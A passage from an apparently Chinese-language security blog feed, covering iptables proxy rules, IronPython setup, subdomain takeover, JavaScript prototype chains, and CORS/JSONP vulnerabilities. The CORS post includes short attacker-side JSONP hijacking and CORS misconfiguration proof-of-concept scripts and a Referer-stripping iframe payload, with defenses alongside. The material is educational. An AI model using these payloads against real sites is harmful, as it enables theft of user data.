nat -A POSTROUTING -o ens33 -j MASQUERADE</span><br><span class="line"></span><br><span class="line">iptables -t nat - N SS</span><br><span class="line">iptables -t nat -A SS -d 1.1.1.1&#x2F;24 -j  RETURN</span><br><span class="line">iptables -t nat -A SS -p tcp -j REDIRECT --to-ports 1080</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp -j SS</span><br><span class="line">iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination 1.2.3.4:53 #配合DNSFORWARD</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ssr </tag>
            
            <tag> iptables </tag>
            
            <tag> openwrt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VS安装ironPython环境</title>
      <link href="2019/01/20/vs-IronPython/"/>
      <url>2019/01/20/vs-IronPython/</url>
      
        <content type="html"><![CDATA[<ol><li>安装<a href="https://github.com/Microsoft/PTVS">PTVS</a></li><li>安装<a href="http://ironpython.net/">IronPython</a></li><li>打开VS2013创建一个IronPython项目</li><li>点击工具-&gt;选项-&gt;Python Tools-&gt;Environment Options-&gt; Add Environment添加ironpython</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> IronPython </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>子域名接管漏洞</title>
      <link href="2018/12/14/subdomain-takeover/"/>
      <url>2018/12/14/subdomain-takeover/</url>
      
        <content type="html"><![CDATA[<h3 id="CNAME子域名接管"><a href="#CNAME子域名接管" class="headerlink" title="CNAME子域名接管"></a>CNAME子域名接管</h3><p>这个漏洞的成因，主要是因为域名（源域名）配置了CNAME，但是CNAME指向的域名并没有被注册。那么攻击者可以注册这个CNAME指向的域名，就可以控制了源域名</p><p>这样攻击者就可以绕过<code>HttpOnly</code>和<code>Secure Cookie</code>的安全配置，盗取用户的cookie，CNAME子域名接管的整个流程如下：</p><pre><code>1. 源域名(sub.example.com)设置了一个CNAME，CNAMED指向的域名为sub.cname.com2. 检查cname.com，如果cname.com没有注册，那么sub.example.com可以成功被接管3. 攻击者注册cname.com，创建恶意页面</code></pre><h3 id="NS子域名接管"><a href="#NS子域名接管" class="headerlink" title="NS子域名接管"></a>NS子域名接管</h3><p>NS记录同样也会收到影响，如果域名的NS记录中，如果有一个域名没有被注册，那么这个域名就可能被接管。</p><pre><code>加入sub.example.com有两个NS记录，分别是ns1.vuln.com, ns2.novuln.com，如果攻击者注册了vuln.com这个域名，那么就有50%的几率受到攻击。如果DNS解析选择了ns1.vuln.com，那么攻击者可以返回一个钓鱼页面，并非原来sub.example.com的页面，并且会缓存很长的时间，攻击者可以设置TTL的时长。</code></pre><h3 id="MX子域名接管"><a href="#MX子域名接管" class="headerlink" title="MX子域名接管"></a>MX子域名接管</h3><p>如果MX记录的子域名被接管了，那么攻击者可以接收到发送到源域名的邮件</p><h3 id="云提供商"><a href="#云提供商" class="headerlink" title="云提供商"></a>云提供商</h3><p>这里有个github(<a href="https://github.com/EdOverflow/can-i-take-over-xyz)%E9%A1%B9%E7%9B%AE%EF%BC%8C%E5%88%97%E5%87%BA%E4%BA%86%E4%BC%9A%E5%8F%97%E5%88%B0%E5%AD%90%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%9A%84%E6%8F%90%E4%BE%9B%E5%95%86">https://github.com/EdOverflow/can-i-take-over-xyz)项目，列出了会受到子域名接管漏洞影响的提供商</a></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://0xpatrik.com/subdomain-takeover-basics/">https://0xpatrik.com/subdomain-takeover-basics/</a></p><p><a href="https://0xpatrik.com/subdomain-takeover/">https://0xpatrik.com/subdomain-takeover/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> dns </tag>
            
            <tag> sec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVASCRIPT 原型链污染</title>
      <link href="2018/12/12/javascript-prototype/"/>
      <url>2018/12/12/javascript-prototype/</url>
      
        <content type="html"><![CDATA[<h3 id="原型和原型链"><a href="#原型和原型链" class="headerlink" title="原型和原型链"></a>原型和原型链</h3><p>当查找一个对象的时候，Javascript会向上遍历原型链(<code>prototype chain</code>)，直到找到给定名称的属性为止，查找到原型链的顶部，也就是<code>Object.prototype</code>，如果这个时候还是没有找到，那么就会返回<code>undefined</code>。例子如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo.prototype.add &#x3D; function (x, y) &#123;</span><br><span class="line">    return x + y + 10;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Object.prototype.sub &#x3D; function(x, y) &#123;</span><br><span class="line">    return x - y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var f &#x3D; new foo();</span><br><span class="line">console.log(f.add(1, 2));   &#x2F;&#x2F;3</span><br><span class="line">console.log(f.sub(1, 2));   &#x2F;&#x2F;-1</span><br></pre></td></tr></table></figure><p>从代码运行的结果来看，<code>sub</code>是通过向上层查找来执行得到的结果，而<code>add</code>是先查找自身属性，如果没有再查找原型，再没有，继续往上走，一直查到<code>Object</code>的原型上（<code>foo</code>-&gt;<code>foo.prototype</code>-&gt;<code>Object.prototype</code>），这就造成了一些安全问题，子类可以随意修改父类的原型的值；在某种层面上说，用<code>for in</code>语句遍历属性的时候，效率也是一个问题。</p><h3 id="hasOwnProperty函数"><a href="#hasOwnProperty函数" class="headerlink" title="hasOwnProperty函数"></a>hasOwnProperty函数</h3><p><code>hasOwnProperty</code>函数是<code>Object.prototype</code>的一个方法，它能够判断一个对象是否包含自定义属性，而不是原型上的属性，因为<code>hasOwnProperty</code>是<code>Javascript</code>中唯一一个处理属性但是不查找原型链的函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Object.prototype.bar &#x3D; 1;</span><br><span class="line">var foo &#x3D; &#123; goo: undefined &#125;;</span><br><span class="line"></span><br><span class="line">foo.bar;    &#x2F;&#x2F;1</span><br><span class="line"></span><br><span class="line">&#39;bar&#39; in foo;   &#x2F;&#x2F;true</span><br><span class="line"></span><br><span class="line">console.log(foo.hasOwnProperty(&#39;bar&#39;));      &#x2F;&#x2F;false</span><br><span class="line">console.log(foo.hasOwnProperty(&#39;goo&#39;));      &#x2F;&#x2F;true</span><br></pre></td></tr></table></figure><p>从上面代码看得出<code>hasOwnProperty</code>能够给出正确的结果，这在遍历对象的时候会很有用。但是有一个需要注意的地方，<code>hasOwnProperty</code>可能会被其他外部对象非法占用，即碰巧某一个对象，有一个属性名也刚好叫做<code>hasOwnProperty</code>，这时候就需要使用外部的<code>hasOwnProperty</code>来获取正确的结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var foo &#x3D; &#123;</span><br><span class="line">    hasOwnProperty: function () &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;,</span><br><span class="line">    bar: &#39;bingo&#39;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">console.log(foo.hasOwnProperty(&#39;bar&#39;));      &#x2F;&#x2F; false</span><br><span class="line"></span><br><span class="line">console.log(Object.hasOwnProperty.call(foo, &#39;bar&#39;));    &#x2F;&#x2F;true</span><br></pre></td></tr></table></figure><p>在循环遍历某个对象的时候，也可以使用<code>hasOwnProperty</code>,这样可以避免原型对象带来的干扰：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Object.prototype.bar &#x3D; 1;</span><br><span class="line">var foo &#x3D; &#123;moo: 2&#125;;</span><br><span class="line">for (var i in foo) &#123;</span><br><span class="line">    console.log(i);     &#x2F;&#x2F;moo, bar</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>foo</code>在自己的原型上没有找到<code>bar</code>，所以向上查找，使用<code>hasOwnProperty</code>保证输出结果正确：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Object.prototype.bar &#x3D; 1;</span><br><span class="line">var foo &#x3D; &#123;moo: 2&#125;;</span><br><span class="line">for (var i in foo) &#123;</span><br><span class="line">    if (foo.hasOwnProperty(i)) &#123;</span><br><span class="line">        console.log(i)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跨域资源漏洞</title>
      <link href="2018/12/06/CORS/"/>
      <url>2018/12/06/CORS/</url>
      
        <content type="html"><![CDATA[<h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><pre><code>同源的必要条件：同协议，同域名，同端口</code></pre><h2 id="需要使用跨域的情况"><a href="#需要使用跨域的情况" class="headerlink" title="需要使用跨域的情况"></a>需要使用跨域的情况</h2><ul><li><p><code>XMLHttpRequest</code>或<code>Fetch</code>发起的跨域HTTP请求</p></li><li><p>Web字体(CSS中通过<code>@font-face</code>使用跨域字体资源)</p></li><li><p>WebGL贴图</p></li><li><p>使用<code>drawImage</code>将Image/video画面绘制到canvas</p></li><li><p>使用样式表(使用CSSOM)</p></li><li><p>引用外部资源</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;...&quot;&gt; </span><br><span class="line">&lt;img src&#x3D;&quot;...&quot;&gt;</span><br><span class="line">&lt;video src&#x3D;&quot;...&quot;&gt;</span><br><span class="line">&lt;embed src&#x3D;&quot;...&quot;&gt;</span><br><span class="line">&lt;frame src&#x3D;&quot;...&quot;&gt;</span><br><span class="line">&lt;iframr src&#x3D;&quot;...&quot;&gt;</span><br><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;...&quot;&gt;</span><br><span class="line">&lt;applet code&#x3D;&quot;...&quot;&gt;</span><br><span class="line">&lt;object data&#x3D;&quot;...&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="功能描述"><a href="#功能描述" class="headerlink" title="功能描述"></a>功能描述</h2><p> 跨域资源共享标准新增了一组 HTTP 首部字段，允许服务器声明哪些源站通过浏览器有权限访问哪些资源。另外，规范要求，对那些可能对服务器数据产生副作用的 HTTP 请求方法（特别是 GET 以外的 HTTP 请求，或者搭配某些 MIME 类型的 POST 请求），浏览器必须首先使用 OPTIONS 方法发起一个预检请求（preflight request），从而获知服务端是否允许该跨域请求。服务器确认允许之后，才发起实际的 HTTP 请求。在预检请求的返回中，服务器端也可以通知客户端，是否需要携带身份凭证（包括 Cookies 和 HTTP 认证相关数据）</p></li></ul><h2 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a>简单请求</h2><pre><code>CORS不会发起预检请求，需要满足一些条件：- GET- HEAD- POST- Accept, Accept-Language, Content-Language 需要为标准值Conten-Type接收三种类型的值：- text/plain- multipart/form-data- application/x-www-form-urlencoded</code></pre><h5 id="REQUEST-HEADER"><a href="#REQUEST-HEADER" class="headerlink" title="REQUEST HEADER:"></a>REQUEST HEADER:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Host: a.com</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:63.0) Gecko&#x2F;20100101 Firefox&#x2F;63.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;foo.example&#x2F;index.html</span><br><span class="line">Origin: http:&#x2F;&#x2F;foo.example</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br></pre></td></tr></table></figure><h5 id="RESPONSE-HEADER"><a href="#RESPONSE-HEADER" class="headerlink" title="RESPONSE HEADER:"></a>RESPONSE HEADER:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx</span><br><span class="line">Date: Sun, 09 Dec 2018 08:57:00 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;UTF-8</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">X-Powered-By: PHP&#x2F;7.2.6</span><br><span class="line">Access-Control-Allow-Origin: http:&#x2F;&#x2F;foo.example</span><br><span class="line">Content-Length: 6</span><br></pre></td></tr></table></figure><h2 id="预检请求"><a href="#预检请求" class="headerlink" title="预检请求"></a>预检请求</h2><pre><code>需预检请求要求必须先使用OPTIONS方法发起一个预检请求到服务器，以获取服务器是否允许该实际的请求，当请求满足下述条件之一时，就需要发送预检请求：- PUT- DELETE- CONNECT- OPTIONS- TRACE- PATCHContent-Type不属于下列之一：- application/x-www-form-urlencoded- multipart/form-data- text/plain</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">OPTIONS REQEUST:</span><br><span class="line"></span><br><span class="line">Host: a.com</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:63.0) Gecko&#x2F;20100101 Firefox&#x2F;63.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Access-Control-Request-Method: POST</span><br><span class="line">Access-Control-Request-Headers: content-type,x-pingother</span><br><span class="line">Origin: http:&#x2F;&#x2F;foo.example</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line"></span><br><span class="line">OPTIONS RESPONSE:</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx</span><br><span class="line">Date: Sun, 09 Dec 2018 08:43:23 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;UTF-8</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">X-Powered-By: PHP&#x2F;7.2.6</span><br><span class="line">Access-Control-Allow-Origin: http:&#x2F;&#x2F;foo.example</span><br><span class="line">Access-Control-Allow-Headers: Content-Type, X-PINGOTHER</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">POST REQUEST:</span><br><span class="line">Host: a.com</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:63.0) Gecko&#x2F;20100101 Firefox&#x2F;63.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;foo.example&#x2F;OPTIONS.html</span><br><span class="line">X-PINGOTHER: pingpong</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">Content-Length: 62</span><br><span class="line">Origin: http:&#x2F;&#x2F;foo.example</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line"></span><br><span class="line">POST RESPONSE:</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx</span><br><span class="line">Date: Sun, 09 Dec 2018 08:43:23 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;UTF-8</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">X-Powered-By: PHP&#x2F;7.2.6</span><br><span class="line">Access-Control-Allow-Origin: http:&#x2F;&#x2F;foo.example</span><br><span class="line">Access-Control-Allow-Headers: Content-Type, X-PINGOTHER</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><h2 id="带身份凭证的请求"><a href="#带身份凭证的请求" class="headerlink" title="带身份凭证的请求"></a>带身份凭证的请求</h2><p>客户端发送请求使用方法<code>withCredentials</code>，服务的的相应中携带<code>Access-Control-Allow-Credentials: true</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">REQUEST:</span><br><span class="line"></span><br><span class="line">Host: a.com</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:63.0) Gecko&#x2F;20100101 Firefox&#x2F;63.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;foo.example&#x2F;withcred.html</span><br><span class="line">Origin: http:&#x2F;&#x2F;foo.example</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line"></span><br><span class="line">RESPONSE:</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx</span><br><span class="line">Date: Sun, 09 Dec 2018 09:43:02 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;UTF-8</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">X-Powered-By: PHP&#x2F;7.2.6</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line">Access-Control-Allow-Origin: http:&#x2F;&#x2F;foo.example</span><br><span class="line">Content-Length: 13</span><br></pre></td></tr></table></figure><p>如果<code>Access-Control-Allow-Credentails</code>为<code>false</code>，或者<code>Access-Control-Allow-Origin</code>设置为<code>*</code>，则响应失败。</p><h2 id="HTTP响应首部字段语法"><a href="#HTTP响应首部字段语法" class="headerlink" title="HTTP响应首部字段语法"></a>HTTP响应首部字段语法</h2><ul><li>Access-Control-Allow-Origin: <origin> | *</li></ul><ul><li><p>Access-Control-Expose-Headers: X-MY-Custom-header, X-My-Custom-header2</p><p>  在跨域访问时，XMLHttpRequest对象的getResponseHeader()方法只能拿到一些最基本的响应头，Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma，如果要访问其他头，则需要服务器设置本响应头。<br>这样浏览器就能够通过getResponseHeader访问X-My-Custom-Header和 X-Another-Custom-Header 响应头<br>了。</p></li><li><p>Access-Control-Max-Age: <delta-seconds></p><p>  <code>Access-Control-Max-Age</code> 头指定了preflight请求的结果能够被缓存多久, delta-seconds 参数表示preflight请求的结果在多少秒内有效。</p></li><li><p>Access-Control-Allow-Methods: <method>[, <method>]*</p><p>  <code>Access-Control-Allow-Methods</code> 首部字段用于预检请求的响应。其指明了实际请求所允许使用的 HTTP 方法。</p></li><li><p>Access-Control-Allow-Headers: <field-name>[, <field-name>]*</p><p>  <code>Access-Control-Allow-Headers</code> 首部字段用于预检请求的响应。其指明了实际请求中允许携带的首部字段。</p></li></ul><h2 id="HTTP请求首部字段"><a href="#HTTP请求首部字段" class="headerlink" title="HTTP请求首部字段"></a>HTTP请求首部字段</h2><ul><li><p>Origin: <origin></p><p>  <code>Origin</code> 首部字段表明预检请求或实际请求的源站。</p></li><li><p>Access-Control-Request-Method: <method></p><p>  <code>Access-Control-Request-Method</code> 首部字段用于预检请求。其作用是，将实际请求所使用的 HTTP 方法告诉服务器。</p></li><li><p>Access-Control-Request-Headers: <field-name>[, <field-name>]*</p><p>  <code>Access-Control-Request-Headers</code> 首部字段用于预检请求。其作用是，将实际请求所携带的首部字段告诉服务器。</p></li></ul><h2 id="JSONP和CORS漏洞"><a href="#JSONP和CORS漏洞" class="headerlink" title="JSONP和CORS漏洞"></a>JSONP和CORS漏洞</h2><ul><li>CORS</li><li>JSONP</li></ul><h2 id="JSONP漏洞"><a href="#JSONP漏洞" class="headerlink" title="JSONP漏洞"></a>JSONP漏洞</h2><p>server:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$callback &#x3D; $_GET[&#39;callback&#39;];</span><br><span class="line">print $callback.&quot;(&#123;&#39;username&#39;:&#39;admin&#39;, &#39;password&#39;:&#39;123456&#39;&#125;);&quot;;</span><br><span class="line">print</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>attacker:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">    function info(data)  &#123;</span><br><span class="line">        alert(data.username);</span><br><span class="line">    &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;http:&#x2F;&#x2F;a.com&#x2F;jsonp.php?callback&#x3D;info&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h3 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h3><p>当服务端没有验证Referer头的时候，会存在JSONP漏洞，所以任何网站都可以从这个域下获取数据。</p><ul><li>要防御这种攻击方式，可以在函数返回数据的时候，返回一个<code>while(1)</code>，这样利用js代码就会陷入无线循环中，攻击者无法获得数据; </li><li>对Callback参数进行过滤检测，不允许callback可定义，过滤JSON里面的敏感数据; </li><li>检测referer头，还需要检测referer是否为空，，一般情况下浏览器直接访问URL是不带Referer的，所以很多防御体系允许空Referer，而跨协议调用JS的时候，Referer也是空  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src&#x3D;&quot;javascript:&#39;&lt;script&gt;function info(data)&#123;alert(data.username);&#125;&lt;&#x2F;script&gt;&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;a.com&#x2F;jsonp.php?callback&#x3D;info&quot;&gt;&lt;&#x2F;script&gt;&#39;&quot;&gt;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure></li><li>部署一次性TOKEN</li></ul><h2 id="CORS错误配置"><a href="#CORS错误配置" class="headerlink" title="CORS错误配置"></a>CORS错误配置</h2><p>服务器(<code>a.com</code>)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Access-Control-Allow-Origin: http:&#x2F;&#x2F;foo.example&quot;);</span><br><span class="line">echo &quot;secret&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>攻击者(<code>foo.example</code>)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">    var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">    xhr.onreadystatechange &#x3D; function() &#123;</span><br><span class="line">        if (xhr.readyState &#x3D;&#x3D;&#x3D; 4) &#123;</span><br><span class="line">            alert(xhr.responseText);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xhr.open(&quot;GET&quot;, &quot;http:&#x2F;&#x2F;a.com&#x2F;secret.php&quot;);</span><br><span class="line">    xhr.send();</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>上面配置了一个白名单域名<code>foo.example</code>，这样就允许了<code>foo.example</code>跨域访问<code>a.com</code>，如果配置错误了，将<code>Access-Control-Allow-Origin</code>设置为<code>*</code>，那么任何人都可以跨域访问到<code>a.com</code>的资源。如果服务端把<code>Access-Control-Allow-Credentials</code>设置为<code>true</code>，允许客户端带上cookie，那么攻击者很容易能够获得用户的数据，如果这样配置了那么浏览器会阻止数据返回。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS</a></p><p><a href="https://www.anquanke.com/post/id/97671">https://www.anquanke.com/post/id/97671</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>找到cloudflare背后的真实IP</title>
      <link href="2017/09/11/evading-cloudflare-protection/"/>
      <url>2017/09/11/evading-cloudflare-protection/</url>
      
